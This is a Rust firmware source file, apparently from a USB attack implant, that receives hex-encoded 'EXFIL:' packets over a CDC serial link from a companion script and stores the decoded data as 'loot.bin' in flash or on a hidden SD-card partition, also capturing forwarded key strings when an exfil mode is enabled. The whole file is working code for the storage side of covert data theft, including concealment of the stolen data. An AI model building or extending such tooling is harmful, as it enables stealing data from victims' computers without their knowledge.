//! exfil.rs — Data exfiltration via CDC serial (ttyACM1)
//!
//! exfil_send.py sends: EXFIL:<hexdata>\n
//! The CDC task receives it via KEY_CHANNEL.
//! exfil_task decodes and appends to loot.bin.

use defmt::*;

use embassy_sync::{blocking_mutex::raw::CriticalSectionRawMutex, signal::Signal};

pub static EXFIL_MODE_ENABLED: Signal<CriticalSectionRawMutex, bool> = Signal::new();

// Streaming write state for loot.bin
static mut LOOT_SLOT: usize = 3;
static mut LOOT_PAGE: usize = 0;   // next page to write
static mut LOOT_TOTAL: usize = 0;  // total bytes written so far
static mut LOOT_PAGE_BUF: [u8; 256] = [0xFFu8; 256];
static mut LOOT_PAGE_POS: usize = 0;  // position within current page
static mut LOOT_STARTED: bool = false;

fn hex_decode(hex: &str, out: &mut heapless::Vec<u8, 512>) {
    let hex = hex.trim();
    let bytes = hex.as_bytes();
    let mut i = 0;
    while i + 1 < bytes.len() {
        let hi = nibble(bytes[i]);
        let lo = nibble(bytes[i+1]);
        if hi < 16 && lo < 16 {
            let _ = out.push((hi << 4) | lo);
        }
        i += 2;
    }
}

fn nibble(b: u8) -> u8 {
    match b {
        b'0'..=b'9' => b - b'0',
        b'a'..=b'f' => b - b'a' + 10,
        b'A'..=b'F' => b - b'A' + 10,
        _ => 255,
    }
}

#[embassy_executor::task]
pub async fn exfil_task() {
    info!("exfil_task: started");
    loop {
        // Wait for a key from the CDC key_listener channel
        let key = crate::usb::cdc::KEY_CHANNEL.receive().await;
        let s = key.as_str();

        // Check if it's an exfil packet
        if s.starts_with("EXFIL:") {
            let hex = &s[6..];
            let mut decoded: heapless::Vec<u8, 512> = heapless::Vec::new();
            hex_decode(hex, &mut decoded);

            if !decoded.is_empty() {
                info!("[exfil] received {} bytes", decoded.len());
                crate::console_log::push("exfil: data received");
                if !unsafe { LOOT_STARTED } { loot_begin().await; }
                loot_append(&decoded).await;
                loot_finish().await;  // finalise after each chunk so data is readable
            }
        } else if EXFIL_MODE_ENABLED.signaled() {
            let enabled = EXFIL_MODE_ENABLED.wait().await;
            if enabled {
                let mut buf: heapless::Vec<u8, 512> = heapless::Vec::new();
                let _ = buf.extend_from_slice(s.as_bytes());
                let _ = buf.push(b'\n');
                if !unsafe { LOOT_STARTED } { loot_begin().await; }
                loot_append(&buf).await;
                loot_finish().await;
            }
        }

        // Forward non-EXFIL keys back to KEY_CHANNEL for WAIT_FOR_KEY
        if !s.starts_with("EXFIL:") {
            crate::usb::cdc::KEY_CHANNEL.try_send(key).ok();
        }
    }
}

/// Returns true if SD hidden partition is available for loot storage
fn use_sd_loot() -> bool {
    crate::usb::msc_sd::sd_available() && crate::usb::msc_sd::hidden_block_count() > 0
}

async fn loot_begin() {
    if use_sd_loot() {
        // SD hidden partition — no erase needed, just reset write cursor
        unsafe { LOOT_PAGE = 0; LOOT_TOTAL = 0; LOOT_PAGE_POS = 0; LOOT_STARTED = true; }
        info!("[exfil] loot → SD hidden partition");
        crate::console_log::push("exfil: loot.bin → SD hidden partition");
        return;
    }
    let fs = crate::fs::FlashFs::new();
    let slot = crate::fs::slot_index_pub("loot.bin").unwrap_or(3);
    match fs.stream_begin_async("loot.bin").await {
        Ok(s) => {
            unsafe { LOOT_SLOT = s; LOOT_PAGE = 0; LOOT_TOTAL = 0; LOOT_PAGE_POS = 0; LOOT_STARTED = true; }
            info!("[exfil] loot.bin slot {} erased, streaming started", slot);
            crate::console_log::push("exfil: loot.bin ready");
        }
        Err(e) => { warn!("[exfil] loot_begin failed: {}", e); }
    }
}

async fn loot_append(data: &[u8]) {
    if data.is_empty() { return; }

    if use_sd_loot() {
        // Write raw to SD hidden partition, page by page
        let mut pos = 0;
        while pos < data.len() {
            let page_pos = unsafe { LOOT_PAGE_POS };
            let take = (data.len() - pos).min(256 - page_pos);
            unsafe { LOOT_PAGE_BUF[page_pos..page_pos+take].copy_from_slice(&data[pos..pos+take]); LOOT_PAGE_POS += take; LOOT_TOTAL += take; }
            pos += take;
            if unsafe { LOOT_PAGE_POS } == 256 {
                let page_idx = unsafe { LOOT_PAGE };
                let mut buf = [0u8; 512];
                // Write as two 256-byte halves of a 512-byte SD sector
                let sector = page_idx / 2;
                let half   = (page_idx % 2) * 256;
                // Read existing sector, patch half, write back
                crate::usb::msc_sd::read_block_hidden(sector as u32, &mut buf);
                buf[half..half+256].copy_from_slice(unsafe { &LOOT_PAGE_BUF });
                crate::usb::msc_sd::write_block_hidden(sector as u32, &buf);
                unsafe { LOOT_PAGE_BUF.fill(0xFF); LOOT_PAGE_POS = 0; LOOT_PAGE += 1; }
            }
        }
        return;
    }

    let fs = crate::fs::FlashFs::new();
    let mut pos = 0;
    while pos < data.len() {
        let page_pos  = unsafe { LOOT_PAGE_POS };
        let space     = 256 - page_pos;
        let take      = (data.len() - pos).min(space);

        unsafe {
            LOOT_PAGE_BUF[page_pos..page_pos+take].copy_from_slice(&data[pos..pos+take]);
            LOOT_PAGE_POS += take;
            LOOT_TOTAL    += take;
        }
        pos += take;

        // Flush full page
        if unsafe { LOOT_PAGE_POS } == 256 {
            unsafe { crate::fs::PAGE_BUF.copy_from_slice(&LOOT_PAGE_BUF); }
            let page_idx = unsafe { LOOT_PAGE };
            let slot     = unsafe { LOOT_SLOT };
            if let Err(e) = fs.stream_chunk_async(slot, page_idx).await {
                warn!("[exfil] page write failed: {}", e);
                return;
            }
            unsafe {
                LOOT_PAGE_BUF.fill(0xFF);
                LOOT_PAGE_POS = 0;
                LOOT_PAGE += 1;
            }
            info!("[exfil] page {} written", page_idx);
        }
    }
}

async fn loot_finish() {
    if use_sd_loot() {
        // Flush remaining partial 256-byte page to SD
        let page_pos = unsafe { LOOT_PAGE_POS };
        if page_pos > 0 {
            let page_idx = unsafe { LOOT_PAGE };
            let sector   = page_idx / 2;
            let half     = (page_idx % 2) * 256;
            let mut buf  = [0u8; 512];
            crate::usb::msc_sd::read_block_hidden(sector as u32, &mut buf);
            buf[half..half+page_pos].copy_from_slice(unsafe { &LOOT_PAGE_BUF[..page_pos] });
            crate::usb::msc_sd::write_block_hidden(sector as u32, &buf);
        }
        info!("[exfil] SD loot done ({} bytes)", unsafe { LOOT_TOTAL });
        crate::console_log::push("exfil: loot saved to SD hidden partition");
        unsafe { LOOT_STARTED = false; }
        return;
    }
    let fs = crate::fs::FlashFs::new();
    let page_pos = unsafe { LOOT_PAGE_POS };
    if page_pos > 0 {
        unsafe { crate::fs::PAGE_BUF.copy_from_slice(&LOOT_PAGE_BUF); }
        let page_idx = unsafe { LOOT_PAGE };
        let slot     = unsafe { LOOT_SLOT };
        let _ = fs.stream_chunk_async(slot, page_idx).await;
    }
    let total = unsafe { LOOT_TOTAL };
    let slot  = unsafe { LOOT_SLOT };
    match fs.stream_finish_async(slot, total).await {
        Ok(()) => {
            info!("[exfil] loot.bin finalised ({} bytes)", total);
            crate::console_log::push("exfil: loot.bin saved");
            unsafe { LOOT_STARTED = false; }
        }
        Err(e) => { warn!("[exfil] finalise failed: {}", e); }
    }
}
